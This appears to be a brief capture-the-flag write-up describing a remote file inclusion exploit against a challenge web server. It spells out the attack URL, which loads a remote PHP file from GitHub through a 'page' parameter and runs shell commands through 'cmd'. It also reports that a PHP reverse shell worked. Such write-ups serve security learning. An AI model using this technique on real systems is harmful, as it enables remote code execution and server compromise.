when press Nothing as we can see a parameter page shows up :

![image](https://user-images.githubusercontent.com/67979878/128606325-65e8b66a-30f6-4b13-a549-01abb226920c.png)


try this and seems to be RFI (remote file inclusion)

![image](https://user-images.githubusercontent.com/67979878/128606348-dedc5118-b990-4193-aa9b-d82318e3332f.png)

i uploaded a php code on a website : 'you can use pastepin or github and get raw link'


![image](https://user-images.githubusercontent.com/67979878/128606388-c3daa7ce-97d5-4a68-8b87-606c366f4620.png)


now let's prepare our page parameter value ;) 

http://ec2-35-158-236-11.eu-central-1.compute.amazonaws.com/global/?page=https://raw.githubusercontent.com/HussienMisbah/test/main/test.php&cmd=ls%20-la


![image](https://user-images.githubusercontent.com/67979878/128606469-9bcbc1f4-5676-4861-b926-46120fcc4225.png)


![image](https://user-images.githubusercontent.com/67979878/128606525-1e6e0cfe-2599-4ea3-810a-2f140df5b46b.png)

edit : i tried to upload a php reverse shell and it worked as well  so you can navigate and read /var/www/html/index.php from the server it self :) 

# done
